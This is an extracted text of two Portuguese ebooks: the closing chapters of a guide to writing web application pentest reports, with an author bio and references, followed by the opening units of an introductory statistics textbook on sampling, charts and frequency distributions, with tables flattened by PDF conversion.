coletados. Nativo no Kali Linux. 
• 
OBS Studio: Para gravação de sessões de teste que podem ser úteis como 
evidência. 
Melhores Práticas: 
• 
Use uma linguagem clara e objetiva. 
• 
Organize a documentação de maneira que seja fácil de seguir. 
Fase 3: Análise de Vulnerabilidades 
Classifique as vulnerabilidades encontradas por criticidade (Baixa, Média, Alta, Crítica). 
Utilize frameworks como CVSS ou EPSS para priorizar as vulnerabilidades. Lembrem-se 
de ir além, aprofunde-se no negócio e avalie o impacto x probabilidade da sua descoberta 
para a organização, forneça dados e pontuação mais alinhados com a realidade do 
contratante. 
Neste passo utilize ferramentas como o Burp suíte Enterprise, OWASP ZAP, OpenVAS 
e nmap. Eles vão realizar de forma automática uma varredura no sistema e ajudarão a 
reduzir tempo de trabalho e falso-positivos. 
Nota: Vulnerabilidades críticas ou de alto impacto para a organização devem ser 
comunicadas imediatamente quando encontradas, para que sejam tomadas ações 
corretivas rapidamente pela equipe técnica. 

 
 
Fase 4: Recomendações 
Crie planos de recomendações que forneçam de forma prática e viável a correção da 
vulnerabilidade descoberta pelo time de engenharia de sistemas. Você até pode oferecer 
medidas paliativas, porém diferencie elas da solução permanente. 
Inclua evidências como capturas de tela, vídeos, logs ou saídas de ferramentas para cada 
vulnerabilidade. Explique claramente o impacto potencial de não corrigir as 
vulnerabilidades em curto, médio e longo prazo. Novamente a proximidade do negócio 
pode colaborar para a assertividade das recomendações, muitos profissionais focam 
apenas nos testes ofensivos e esquecem de soft skills que podem fazer a diferença 
durante a apresentação. 
Não ofereça como primeira opção de correção mudanças em infraestrutura, elas são 
mais complexas e geram discussões quentes quando apresentadas. Prefira focar em 
soluções que necessitam apenas de ajustes de configuração ou mudanças singelas no 
software. 
Fase 5: Revisão e Validação 
Antes de apresentar revise o conteúdo técnico do relatório em busca da precisão. Realize 
uma revisão editorial para garantir clareza e correção gramatical.  
Utilize uma formatação consistente: fontes, cores, cabeçalhos. Inclua sumário e número 
da página. 
Não encaminhe para a organização descobertas realizadas unicamente por ferramentas 
automatizadas, além de não pegar bem, pode gerar discussões durante a apresentação 
que você não conseguirá responder. 
Confirme também se todas as descobertas são bem suportadas por evidências. 
Novamente assegure-se de que as recomendações sejam relevantes e aplicáveis. 
Ao final de cada vulnerabilidade insira links para recursos e documentações externas que 
possam contribuir para elucidação das descobertas. 
Fase 6: Entrega e Apresentação do Relatório 
Prepare uma apresentação clara e objetiva das descobertas principais, esclareça de 
forma rápida e objetiva as descobertas, insira as capturas de tela, vídeo e cópias de logs 
nos slides.  
Esteja preparado para responder perguntas técnicas e não técnicas. 
Ferramentas Gratuitas para Elaboração de Relatórios 
• 
Joplin: Um aplicativo de anotações que suporta Markdown. 
• 
DokuWiki: Um wiki simples para documentar o processo de pentest. 

 
 
• 
Dradis Framework: Um framework de código aberto para compartilhamento de 
informações durante pentests. 
• 
Faraday: Uma plataforma colaborativa para pentest que integra várias 
ferramentas. 
Ou vá além e use o Sysreptor (https://github.com/Syslifters/sysreptor), uma solução de 
elaboração de relatórios de segurança ofensiva totalmente personalizável, projetada para 
pentesters, redteams e outras pessoas relacionadas à cyber security. Nele é possível criar 
projetos baseados em HTML e CSS, escrever seus relatórios em Markdown e convertê-
los para PDF. 
Benefícios 
• Escrever em markdown 
• Design em HTML/VueJS 
• Renderizar seu relatório para PDF 
• Totalmente personalizável 
• Auto-hospedado ou Nuvem 
• Não há necessidade de Word 
A criação de um relatório de pentest eficiente requer tempo, planejamento, atenção aos 
detalhes e o uso de ferramentas apropriadas. Lembre-se de adicionar esse esforço ao 
seu cronograma para atender os prazos que foram acordados. 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
 
PARA FINALIZAR  
Ao longo deste ebook, exploramos os principais conceitos e práticas envolvidos no teste 
de vulnerabilidade em aplicações web, abordando desde os fundamentos de segurança 
de aplicação até as ameaças emergentes que desafiam as defesas digitais atuais. 
Começamos com uma introdução aos Fundamentos de Segurança em Aplicações Web, 
destacando a importância de criar bases seguras para o desenvolvimento e operação de 
aplicações web. Em seguida, mergulhamos no Recon, fase responsável por mapear e 
entender a superfície de ataque. 
A transição para a Segurança Ofensiva nos permitiu observar o outro lado da moeda, onde 
abordagens técnicas são empregadas para encontrar falhas antes que possam ser 
exploradas por atores maliciosos. O foco em Teste de Vulnerabilidade em APIs destacou 
a crescente importância das APIs no ecossistema moderno e os riscos particulares 
associados a elas, como falhas de autenticação e controle de acesso inadequado. 
Finalizamos com uma observação sobre Ameaças Emergentes, que estão sempre 
evoluindo à medida que novas tecnologias e metodologias surgem e entendemos como 
elaborar um relatório de teste que gera impacto. 
O aprendizado contínuo e a adoção de práticas de segurança robustas são fundamentais 
para mitigar riscos e garantir a proteção eficaz das aplicações web. A segurança é um 
processo contínuo, e este ebook serve como um guia inicial para navegá-lo com sucesso. 
 
 
Vitor Luiz Ramos Barbosa, o autor. 
 
 

 
 
Sobre o autor 
 
Vitor Luiz Ramos Barbosa é especialista em Segurança da Informação e Sistemas pela 
Universidade Federal de Goiás e graduação em Redes de Computadores pela Faculdade 
SENAI Goiás. Tendo atuado por mais de 15 anos como docente de graduação e pós-
graduação em diversas instituições de ensino superior, incluindo Faculdade SENAI Goiás, 
Universidade Federal de Goiás e Faculdade Impacta em São Paulo, também exerceu o 
papel de pesquisador e orientador de trabalhos de conclusão de curso nessas instituições. 
Desempenhou a função de coordenador de Segurança da Informação e DPO na 
Saneamento de Goiás S.A (SANEAGO),  atuou como Especialista em Segurança de 
Aplicações no quinto maior banco público do país, o Banco Votorantim (Banco BV) e 
atualmente é Especialista II em Segurança de Aplicações na maior empresa de tecnologia 
em Identidade Digital e Reconhecimento facial do Brasil, a Unico ID Tech. 
 
 
 
 
 
 
 
 
 

 
 
Referências Bibliográficas 
 
WEIDMAN, Georgia. Teste de invasão: Uma introdução prática ao hacking.1. ed. São 
Paulo: Novatec Editora, 2014.  
BALL, Corey J. Hacking APIs: Breaking Web Application Programming Interfaces. 
San Francisco: No Starch Press, 2022.  
HOFFMAN, Andrew. Web Application Security: Exploitation and Countermeasures 
for Modern Web Applications. Sebastopol: O’Reilly Media, 2020.  
UTO, Nelson. Teste de invasão de aplicações Web. Rio de Janeiro, Escola Superior de 
Redes, 2013. 


--- Fim do arquivo: eBook - Teste de Aplicações Web.pdf ---

--- Começo do arquivo: eBook - Probabilidade e Estatística.pdf ---

 
 
Unidade 1: Estatística Descritiva 
 
Nessa unidade falaremos sobre os conceitos, básicos, definições, organização e 
resumo dos dados em tabela com distribuição de frequência, além de citar os 
principais gráficos estatísticos, que podem facilmente ser construídos por programas 
ou aplicativos, como o excel. 
 
1.1- Introdução à estatística. 
 
Temos registros Estatísticos desde a antiguidade: registros de números de 
habitantes, nascimentos, óbitos, impostos, contagem em geral (principalmente para 
finalidades tributárias ou bélicas). Posteriormente (a partir do séc. XVI), surge a 
necessidade de chegar à conclusão sobre “o todo” partindo da observação “de partes” 
dele, princípio da Estatística. 
Inicialmente muito conhecimento foi adquirido por acaso, porém, com a diversidade 
de pessoas em estudos e técnicas, surge a necessidade do estabelecimento de meios 
organizados para se chegar a algum resultado de interesse. Principais métodos: 
experimental, numérico e estatístico. 
O método experimental fixa todos os fatores de entrada numa análise, exceto um, 
o qual é variado de forma a possibilitar a descoberta de seus efeitos. 
O método numérico busca modelar numericamente os fatores mais importantes de 
um processo e tenta simular o comportamento ou resultado deste processo. 
O método estatístico surge quando no estudo de alguns aspectos onde não é 
possível a fixação de fatores (p.ex. os sociais), ao contrário, é necessário a consideração 
de variações simultâneas destes, na tentativa da descoberta (e/ou previsão) de seus 
efeitos. Busca-se determinar o grau de influência de cada fator na resposta final. 
 
1.2 – Estatística 
 
É a parte da matemática aplicada que fornece métodos para coleta, descrição, 
análise e interpretação de dados, auxiliando na tomada de decisões. 

Divide-se em Estatística Descritiva (coleta, organização e descrição de dados) e 
Estatística Indutiva ou Inferencial (análise e interpretação). Aqui trataremos da 
estatística descritiva. 
 
1.2.1 – Fase 01: Coleta de dados. 
A coleta dos dados é realizada após um cuidadoso planejamento e determinação 
das características mensuráveis do fenômeno coletivamente típico que se quer 
pesquisar. 
A coleta pode ser direta (é feita sobre os elementos informativos – P.Ex.: 
quantidade de nascimentos, óbitos, renda mensal, etc) e indireta (é feita sobre 
elementos relacionados ou é inferida dos elementos conhecidos – P.Ex.: mortalidade 
infantil / dados colhidos de uma coleta direta). 
Coleta direta: contínua (feita continuamente sem interrupções, p.ex.: nascimentos 
e óbitos), periódica (feita em intervalos regulares de tempo, p.ex.: censo a cada década), 
ocasional (extemporais geralmente de caráter investigativo ou emergencial – p.ex.: 
Epidemias). 
 
1.2.2 – Fase 02: Crítica dos dados. 
Procura de possíveis falhas e/ou imperfeições que podem ocorrer por parte do 
informante (crítica externa) por pressa, distração, mal-entendimento ou quando analisa 
os elementos amostrados (interna) em busca de falhas tipográficas, irregularidades, etc. 
 
1.2.3 – Fase 03: Apuração: soma e processamento de dados obtidos (manual, 
eletromecânica ou eletrônica); 
 
1.2.4 – Fase 04: Exposição ou apresentação de dados. Os meios mais utilizados são as  
tabelas e gráficos. 
 
1.2.5 – Fase 05: Análise de resultados 
Visa tirar conclusões e fazer previsões sobre o todo (população) a partir de uma 
parte (amostra) que seja representativa. 
 
1.3  Aplicações  
 

    Auxílio na tomada de decisões (organização, direção e controle de processos); 
Sondagem dos recursos disponíveis (naturais e sociais); 
Avaliação de processos e técnicas; 
Planejamento (metas, planos, objetivos, estratégias); 
Critérios de desempenho (avaliação, verificação e controle); 
Documentação (acompanhamento do ciclo de evolução do produto, empresa etc); 
Tratamento de erros (estabelecimento de ordens de grandeza); 
Versatilidade sobre a dinâmica de sistemas (estabelecimento de processos); 
Controle de qualidade; 
Projeções;  
Etc; 
 
1.4  Variáveis Estatísticas 
As variáveis estatísticas são os conjuntos de resultados possíveis. 
.Ex.: 
Sexo ® masculino / feminino; 
Número de Filhos ® 0, 1, 2, 3.....; 
Estatura ® 1,5m,  1,68m, 1,824m ......; 
 
As variáveis podem ser classificadas como: qualitativas e quantitativas. 
 
1.4.1 Variáveis Qualitativas expressam atributos dos dados, como: sexo (M/F), 
pele (branca, preta, amarela etc), estado de origem (GO, TO, MA etc), grau de instrução 
(primário, 2o grau, 3o grau). Podem se subdividir em nominais ou ordinais. 
As Variáveis qualitativas nominais não possuem ordenação, por exemplo, 
nacionaliade, tipo de sangue, cor dos olhos, etc. Já as variáveis qualitativas ordinais tem 
ordenação nas realizações, por exemplo: grau de instrução (fundamental, médio ou 
superior), patente militar,  etc. 
 
1.4.2 Variáveis Quantitativas são expressas por números: salários, idades, 
alturas, pesos etc. Podem se subdividir em discretas, obtidas em contagens e 
numerações, ou contínuas, obtidas por medições com intervalo de valores. 
  

Ex: Uma pesquisa realizada sobre a quantidade de filhos, a variável é quantitativa 
discreta, já em uma pesquisa sobre faixa de valores salariais a variável é quantitativa 
contínua. 
 
 
1.5 População e amostra 
População: conjunto de entes portadores de uma característica de interesse 
(população estatística ou universo estatístico). 
Amostra: subconjunto finito e representativo da população. 
Nem sempre é possível estudar toda a população (censo) para se identificar 
precisamente uma característica de interesse (variável). Existem várias limitações: 
desconhecimento da dimensão da população, população enorme (infinita) e esparsa, 
tempo escasso, processo de inspeção inadequado (pode ser destrutivo) etc. Assim, é 
necessário estimar tais variáveis através de estudos de parte dessa população, ou 
melhor, analisando-se amostras.  
Os principais processos de amostragem são: Amostragem Aleatória Simples; 
Amostragem Sistemática, Amostragem Estratificada e Amostragem por Conglomerados 
ou Agrupamentos.  
 
1.5.1 Amostragem Aleatória: 
Numera-se a população e sorteia-se, por meios aleatórios um número “n” de 
elementos.  
Ex.:  Obter uma amostra da estatura de 90 alunos composta por 9 registros. 
- 
Enumeramos todos os 90 alunos; 
- 
Sorteamos 9 alunos (eletronicamente ou com tabela de números aleatórios); 
- 
Medidos e registramos as estaturas dos 9 alunos sorteados.  
Os 9 alunos serão uma amostra para a característica estatura. 
 
1.5.2 Amostragem Sistemática: 
A população é dividida em várias partes iguais, sendo escolhido aleatoriamente 
elementos em cada parte para compor a amostra.  
Ex: Deverá ser realizada uma pesquisa sobre infestação de dengue numa rua com 
800 casas inspecionando-se apenas 40 delas (amostra). 
População = 800 casas 

Amostra = 40 casas (40/800=0,05=5%). 
Blocos de casas = 800/40 = 20 blocos (cada um dos 20 blocos contém 40 casas). 
Extrações =40/20 = 2 (dois sorteios por bloco) 
 
São sorteados dois números entre 1 e 40, depois de 41 a 80 e assim por diante. 
(Supondo aqui que foram sorteados o 16 e o 22). 
 
Casas inspecionadas ( ® ¯ ). 
16 
22 
56 
62 
96 
102 
136 
142 
176 
182 
216 
222 
256 
262 
296 
302 
336 
342 
376 
382 
416 
422 
456 
462 
496 
502 
536 
542 
576 
582 
616 
622 
656 
662 
696 
702 
736 
742 
776 
782 
 
 
 
 
Ex: Um banco de dados possui 5610 registros, de onde deverão ser retirados 
apenas 42 através do processo de amostragem sistemática. Como isso pode ser feito? 
População = 5610 registros 
Amostra = 42 registros 
Blocos = MDC(5610,42) = 6 blocos (cada bloco possui 935 registros = 5610/6) 
Extrações (=42/6=7) = Sete sorteios em cada bloco 
 
São sorteados 7 números entre 1 e 935. Supondo: 5,6, 200, 350, 501, 674, 888. 
 
Para cada bloco (Bl), tomam-se os elementos nas posições sorteadas (5,6, 200, 
350, 501, 674, 888), o que implicará na amostra sendo composta pelos elementos: Bl-
01:[ 5,6, 200, 350, 501, 674, 888],  Bl-02:[940,941,1135,1285,1436,1609,1823],  Bl-
03:[1875,1876,2070,2220,2371,2544,2758], 
Bl-04: 
[2810,2811,3005,3155,3306,3479,3693], 
Bl-
05:[3745,3746,3940,4090,4241,4414,4628] 
e 
 
Bl-
06:[4680,4681,4875,5025,5176,5349,5563].   
 

OBS.: O MDC é um parâmetro que pode se utilizado para facilitar a determinação da 
quantidade de blocos. 
1.5.3 Amostragem proporcional estratificada: considera-se a existência de 
extratos dentro da população estatística, ou seja, subgrupos específicos. Desta forma, 
as proporções de extratos na população são mantidas na amostra. 
Ex: Supondo-se uma população de automóveis composta de acordo com o quadro 
abaixo, de onde deverá ser retirada uma amostra de 25% da população: 
 
TIPO 
Q 
Utilitários 
1200 
Esportes 
800 
Luxo 
100 
Cargas 
200 
TOTAL 
2300 
 
Dimensão prevista para a Amostra = 25%.2300 = 0,25.2300 = 575 automóveis. 
 
TIPO 
Q  
Existente 
% Existente 
Q Extraída 
Utilitários 
1200 
= 1200/2300 @ 0,5217 = 
052,17% 
= 52,17%.575 = 299,97 = 
300 
Esportes 
800 
= 800/2300 @ 0,3478 = 
034,78%  
= 34,78%.575 = 199,99 = 
200 
Luxo 
100 
= 100/2300 @  0,0435 = 
004,35% 
= 04,35%.575 = 025,01 = 
025 
Cargas 
200 
= 200/2300 @ 0,0870 = 
008,70%  
= 08,70%.575 = 050,02 = 
050 
TOTAL 
2300 
= 2300/2300 @ 1,0000 = 
100,00% 
575 
 
Dimensão da amostra = 575 automóveis, sendo 300 Utilitários, 200 Esportes, 25 
Luxos e 50 Cargas. Serão sorteados automóveis até o preenchimento destas 
quantidades extratificadas.  

 
Ex: Supondo-se uma pesquisa eleitoral com 571 pessoas com os seguintes graus 
de instrução: Superior (S) = 64, Médio (M) = 129 e Básico (B) = 378. Deseja-se uma 
amostra de 47 indivíduos. Definir as quantidades de S, M e B na amostra. 
 
Instrução 
Q 
Superior 
64 
Médio 
129 
Básico 
378 
TOTAL 
571 
 
TIPO 
Q 
Existente 
% Existente 
Q Extraída 
Superior 
64 
= 064/571 = 011,21% 
= 0,1121.47 = 05,27 = 05 
Médio 
129 
= 129/571 = 022,59% 
= 0,2259.47 = 10,62 = 11 
Básico 
378 
= 378/571 = 066,19%  
= 0,6619.47 = 31,10 = 31 
TOTAL 
571 
= 571/571 = 100,00% 
47 
 
A amostra deverá ser composta por 5 S, 11 M e 31 B (47 pessoas). 
 
 
1.6- Séries Estatísticas 
 
 
1.6.1- As sintetizam valores de variáveis possibilitando uma visão global das 
variações. Os principais componentes de uma tabela são: 
 
 
Produção de Café 
Brasil – 1991 a 1995 
Anos 
Produção 
(1000t) 
1991 
2.535 
Título 
Cabeçalho 
Coluna Numérica 
Célula 
Linhas 
Cabeçalho 
Rodapé 
Corpo 

1992 
2.666 
1993 
2.122 
1994 
3.750 
1995 
2.007 
Fonte: IBGE 
 
 
 
1.6.2- Séries Estatísticas: Tabelas que apresentam a distribuição de um conjunto de 
dados estatísticos em função da época (tempo), local (espaço) ou espécie. Podem ser 
classificadas em: históricas, geográficas ou específicas. 
 
 
 
 
 
 
 
 
 
 
 
 
Séries Históricas, 
cronológicas, temporais ou 
marchas. 
 
Preço do ACÉM no varejo 
São Paulo – 1989 a 1994. 
ANOS 
PREÇO  
MÉDIO 
(US$) 
1989 
2,24 
1990 
2,73 
1991 
2,12 
1992 
1,89 
1993 
2,04 
1994 
2,62 
 Fonte: APA. 
Séries Geográficas, 
espaciais, territoriais ou de 
localização. 
 
Duração Média dos Estudos 
Superiores – 1994. 
PAÍSES 
ANOS 
Itália 
7,5 
Alemanha 
7,0 
França 
7,0 
Holanda 
5,9 
Inglaterra Menos que 4,0 
 Fonte: Revista Veja. 
Séries Específicas 
 
Óbitos de animais na Fazenda 
ALVORADA-TO em 1990. 
Animais 
Média 
Mensal 
Bovinos 
0,3 
Eqüinos 
0,6 
Suínos 
1,1 
Ovinos 
3,2 
Caprinos 
1,03 
 Fonte: Cooperativa 3. 

 
 
 
 
 
 
UNIDADE 2. Gráficos 
 
Forma de apresentação de dados possibilitando a visualização de um fenômeno 
de forma mais rápida que as tabelas. Precisa ter: simplicidade, organização, precisão, 
clareza e veracidade. Os principais tipos são: os cartogramas, os pictogramas e os 
diagramas. 
 
2.1- Os Cartogramas e pictogramas: 
 
Figuras diretamente relacionadas com áreas geográficas ou políticas. 
 
Fonte: https://adenilsongiovanini.com.br/blog/cartograma-o-que-e-e-tipos-
existentes/ 
 
Os Pictogramas são representados por figuras. Isso torna o gráfico mais lúdico. 
É um gráfico utilizado para chamar atenção para cada item, deixando claro o tipo, 
mesmo sem ler a legenda. 

Esse pictograma representa as notas atribuídas a cada site 
 
 
Fonte: https://www.tecmundo.com.br/como-fazer/32697-excel-como-criar-um-
pictograma.htm 
2.3- Colunas e Barras 
 
Os gráficos de colunas são úteis para representar comparação entre itens. Nos 
gráficos de colunas, as categorias são geralmente organizadas ao longo do eixo 
horizontal e os valores ao longo do eixo vertical.  
O gráfico a seguir traz a taxa de conclusão de cursos presenciais em 2023 na 
região Centro Oeste 
 
 

 Fonte: https://www.semesp.org.br/mapa/edicao-13/regioes/centro-oeste/ 
 
Os gráficos em Barras Horizontais são semelhantes aos gráficos de coluna e sua 
utilização, porém nos gráficos de barras, as categorias são geralmente organizadas ao 
longo do eixo vertical e os valores ao longo do eixo horizontal.  
O gráfico a seguir representa o panorama sobre as matrículas nas modalidades 
presencial e EAD na região Centro Oeste em 2023 
 
Fonte: https://www.semesp.org.br/mapa/edicao-13/regioes/centro-oeste/ 
 
2.5 Linhas 
 
O gráfico de linhas é utilizado quando existe a necessidade de analisar dados ao 
longo do tempo. Esse tipo de gráfico é muito presente em análises financeiras. O eixo 
das abscissas (eixo x) representa o tempo, que pode ser dado em anos, meses, dias, 
horas etc., enquanto o eixo das ordenadas (eixo y) representa o outro dado em 
questão. Observe o exemplo a seguir 
 

 
Fonte: https://www.siteware.com.br/blog/indicadores/graficos-de-indicadores/ 
 
 
O gráfico de linhas também é indicado quando é necessário apresentar dois 
resultados simultâneos. 
 
 
Fonte: https://wiki.taticview.com/index.php/Line_Chart/pt-br 
 
 
2.5 Setores (Pizza): 

 
Esse gráfico é muito utilizado para representar os dados em porcentagem. Para 
construir o gráfico usamos ângulos na seguinte proporção: cada 36° representa 10%.  
 
 
 
 
Nesse gráfico podemos analisar o percentual de preferência esportiva da 
amostra, por exemplo, 40% dos pesquisados preferem Futebol e apenas 5% preferem 
Outros esportes. 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

 
UNIDADE 3: DISTRIBUIÇÃO DE FREQUÊNCIA 
 
A distribuição de frequência auxilia no resumo dos dados. Veremos aqui frequência 
simples que consiste na quantidade de dados em cada classe, frequência relativa que 
representa o percentual de dados em cada classes e frequência simples e relativa 
acumulada. 
 
3.1 Distribuição de Frequências  
 
Imagina-se o seguinte resultado de uma pesquisa quanto à “procedência” (Var. 
Qual. Nominal) de alunos de uma escola de 2o grau (tabela primitiva): 
Resultado da pesquisa com ordenação (rol) na tabela de frequências  
 
 
 
Procedência de Alunos (tabela primitiva) 
a 
Bairro 
a 
Bairro 
a 
Bairro 
a 
Bairro 
1 
Goya 
6 
Goya 
11 
Universitário 
16 
Centro 
2 
São Francisco 7 
Centro 
12 
Vila Moraes 
17 
Marista 
3 
Centro 
8 
Vila Nova 
13 
Bueno 
18 
Jardim Goiás 
4 
Centro 
9 
Universitário 
14 
Bueno 
19 
Fama 
5 
Centro 
10 
Universitário 
15 
Marista 
20 
Jardim Goiás 
 
Procedência de Alunos (rol) 
a 
Bairro 
a 
Bairro 
a 
Bairro 
a 
Bairro 
1 
Bueno 
6 
Centro 
11 
Jardim Goiás 
16 
Universitário 
2 
Bueno 
7 
Centro 
12 
Jardim Goiás 
17 
Universitário 
3 
Centro 
8 
Fama 
13 
Marista 
18 
Universitário 
4 
Centro 
9 
Goya 
14 
Marista 
19 
Vila Moraes 
5 
Centro 
10 
Goya 
15 
São Francisco 
20 
Vila Nova 
 
Bairro 
f 
Bueno 
2 
Centro 
5 
Fama 
1 
Goya 
2 
Jardim Goiás 
2 
Marista 
2 
São Francisco 
1 
Universitário 
3 
Vila Moraes 
1 
Vila Nova 
1 
 
 
5 
 B  C  F G  J  M S  U V  V 

 
 
 
3.2- DISTRIBUIÇÕES DE FREQÜÊNCIAS EM CLASSES: 
 
3.2.1 REPRESENTAÇÃO PONTUADA: Cada valor do rol é marcado com um ponto 
sobre a reta dos números reais. Pode ser utilizada para qualquer variável quantitativa. 
 
ROL 
REPRESENTAÇÃO PONTUADA 
Rol: {6,2; 6,2, 6,3; 6,5; 6,5; 6,5; 6,5; 6,6} 
n=8 
Min = 6,2 
Max = 6,6 
A = Max – Min = 6,6-6,2 = 0,4 
 
 
 
Rol: {1,05; 1,05, 1,06; 1,07; 1,07; 1,08; 
1,09; 1,10} 
n=8 
Min = 1,05 
Max = 1,10 
A = Max – Min = 1,10-1,05 = 0,05 
 
 
 
Rol: {2, 2, 3, 3, 3, 3, 4, 4, 4, 5, 5, 5, 5, 5, 
5} 
n=15 
Min = 2 
Max = 5 
A = Max – Min = 5-2 = 3 
 
 
 
Rol: {8,019; 8,019; 8,019; 8,020; 8,020; 
8,021; 8,021; 8,021; 8,021; 8,023; 8,023; 
8,024; 8,026; 8,026; 8,026} 
n=15 
Min = 8,019 
Max = 8,026 
 
 
 
6,2
6,3
6,4
6,5
6,6
1,05
1,06
1,07
1,08
1,09
1,10
2
3
4
5
8,019
8,020
8,021
8,022
8,023
8,024
8,025
8,026

A = Max – Min = 8,026-8,019 = 0,007 
Rol: {3,0008; 3,0009; 3,0009; 3,0010; 
3,0011; 3,0012; 3,0012; 3,0013; 3,0014} 
n=9 
Min = 3,0008 
Max = 3,0014 
A = Max – Min = 3,0014-3,0008 = 0,0006 
 
 
 
 
 
 
3.2.2 – Distribuição em Classes 
Em alguns casos a quantidade de dados é grande e deixaria a tabela carregada. Com 
o intuito de diminuir e simplificar a tabela agrupamos os dados por classes. 
 
Ex: Segue uma aplicação da distribuição em classes, para o rol a seguir, que contém 30 
registros, provenientes de uma TABELA PRIMITIVA: 
 
 
 
 
 
 
 
 
 
 
Seguem os parâmetros calculados a partir do rol dado: 
 
Þ MÍNIMO (Min): 1,61 m 
Þ MÁXIMO (Máx): 1,98 m. 
Þ AMPLITUDE AMOSTRAL (A):   A = Max – Min = 1,98 – 1, 61 = 0,37 m. 
Þ QUANTIDADE DE CLASSES (k) Raiz (kR): 
Método da Raiz: kr = 
 = 
 @ 5,48 
3,0008
3,0009
3,0010
3,0011
3,0012
3,0013
3,0014
n
30
Altura de alunos (rol) 
aluno 
Altura 
aluno 
Altura 
aluno 
Altura 
1 
1,61 
11 
1,71 
21 
1,81 
2 
1,62 
12 
1,73 
22 
1,81 
3 
1,63 
13 
1,73 
23 
1,84 
4 
1,63 
14 
1,73 
24 
1,88 
5 
1,64 
15 
1,73 
25 
1,89 
6 
1,64 
16 
1,75 
26 
1,89 
7 
1,65 
17 
1,78 
27 
1,90 
8 
1,66 
18 
1,80 
28 
1,91 
9 
1,68 
19 
1,80 
29 
1,93 
10 
1,71 
20 
1,80 
30 
1,98 
 

 
Þ AMPLITUDE DE CLASSES (h):  h = A/k = 0,37/6 = 0,0616666666666.... 
As classes são organizadas então em forma de tabela, sendo que na primeira coluna 
estão indicadas as classes (tabela abaixo à esquerda). Na segunda coluna, são 
indicados os limites de cada classe sendo que o limite inferior pertence à classe (ponto 
fechado) e o superior não pertence (ponto aberto). A coluna seguinte se refere ao Ponto 
Médio de cada classe e a última coluna, à frequência da classe. 
Þ PONTO MÉDIO DA CLASSE (Pm):   Numa determinada classe “i”, o ponto médio é 
obtido fazendo-se Pmi = (Vini  +  Vfini)/2. Assim: Pm1 = (1,609 + 1,671)/2 = 1,640;  Pm2 = 
(1,671 + 1,733)/2 = 1,702;  Pm3 = (1,733 + 1,795)/2 = 1,764;  Pm4 = (1,795 + 1,857)/2 = 
1,826;  Pm5 = (1,857 + 1,919)/2 = 1,888;  e,  Pm6 = (1,919 + 1,981)/2 = 1,950. 
 
Ex; Segue uma distribuição em classes de frequências para ilustração das fases deste 
procedimento. 
 
1) Tabela Primitiva (Sacas de Arroz x Peso por saca – kg): 
s 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 11 12 13 14 15 16 17 
P 50
,8 
50
,3 
50
,2 
50
,2 
50
,8 
50
,8 
50
,1 
50
,3 
50
,3 
50
,8 
50
,6 
50
,3 
50
,3 
50
,7 
50
,3 
50
,6 
50
,1 
 
2) ROL: 
s 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 11 12 13 14 15 16 17 
P 50
,1 
50
,1 
50
,2 
50
,2 
50
,3 
50
,3 
50
,3 
50
,3 
50
,3 
50
,3 
50
,6 
50
,6 
50
,7 
50
,8 
50
,8 
50
,8 
50
,8 
 
3) Parâmetros: 
Mín=50,1;    Max=50,8;    A=0,7;    n=17;     
Quantidade de classes : kr=
@4,12  (5<=k<=18®Ok); 
h=A/k=0,7/5=0,14Þ0,15;     
Aa=kxh=5x0,15=0,75;     D=Aa-A=0,75-0,7=0,05;     
Vi=Min-D/2=50,1-0,05/2=50,1-0,025=50,075; 
Vf=Max+D/2=50,8-0,05/2=50,8-0,025=50,825;   
 
17

 
4) Tabela de Distribuição em Classes (marcações sobre o rol): 
 
 
   
 
 
 
 
 
3.2.4 Tipos de frequência  
 
Na 
apresentação 
dos 
tipos 
de 
frequência, 
utilizaremos a análise de um caso apresentado pela 
tabela ao lado. Estão registradas 12 observações 
(n=12) do lançamento de um dado, com os 
respectivos valores das faces (F): 
FREQUENCIA 
SIMPLES 
ou 
FREQUENCIA 
ABSOLUTA 
ou 
FREQUENCIA (f): número de observações. Assim: f1=3, f2=1, f3=2, f4=0, 
f5=4 e f6=2. O somatório de frequências absolutas corresponde ao 
número total de observações: S fi = f1+f2+....fn= n, no caso S fi = f1+f2+f3+ 
f4+f5+f6 = 3+1+2+0+4+2 = 12. 
FREQUENCIA ACUMULADA (fac): número de observações até o 
limite superior de uma classe. Assim: faci = faci-1+fi. No caso temos 
que: fac1=fac0+f1=0+3=3,fac2=fac1+f2=3+1=4,fac3=fac2+f3=4+2=6,  
fac5=fac3+f5=6+4=10  e   fac6=fac5+f6=10+2=12. Observa-se que a 
última fac deve corresponder ao total de observações. (facn=n ® 
fac6=12). 
FREQUENCIA RELATIVA ABSOLUTA ou FREQUENCIA RELATIVA (fr): razão entre a 
frequência da classe e o número total de frequências (observações). Assim: fri = fi/n. No 
caso temos que:   fr1 = f1/12 = 3/12 = 1/4 = 0,25 = 25%,   fr2 = f2/12 = 1/12 @ 0,083 = 
8,33%,   fr3 = f3/12 = 2/12 = 1/6 @ 0,167 = 16,67%,   fr5 = f5/12 = 4/12 = 1/3 @ 0,33 = 
S 
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
P 50,1 50,1 50,2 50,2 50,3 50,3 50,3 50,3 50,3 50,3 50,6 50,6 50,7 50,8 50,8 50,8 50,8
12 Lançamentos de um dado 
n 
F 
n 
F 
n 
F 
1 
1 
5 
5 
9 
6 
2 
2 
6 
5 
10 
6 
3 
1 
7 
3 
11 
5 
4 
3 
8 
1 
12 
5 
 
T.F. 
F 
f 
1 
3 
2 
1 
3 
2 
5 
4 
6 
2 
     S = 12        
Tabela de 
frequências 
F 
f 
fac 
1 
3 
3 
2 
1 
4 
3 
2 
6 
5 
4 
10 
6 
2 
12 
      S =    12        
Tabela de Distribuição (k=5; h=0,15) 
k 
Intervalos 
Pm 
f 
1 
[ 50,075 ; 50,225 [ 
50,2 
4 
2 
[ 50,225 ; 50,375 [ 
50,3 
6 
3 
[ 50,375 ; 50,525 [ 
50,5 
0 
4 
[ 50,525 ; 50,675 [ 
50,6 
2 
5 
[ 50,675 ; 50,825 [ 
50,8 
5 
S 
30 
 
OBS.: 
Os valores negritados são Vi e Vf 

33,33% e fr6 = 2/12 = 1/6 @ 0,167 = 16,67%. Observa-se que Sfr = 1/1 = 1,000 = 100,00%. 
Pode ser expressa em uma das formas: decimal, fracionária ou percentual. 
FREQUENCIA RELATIVA ACUMULADA (frac): razão entre a frequência relativa da 
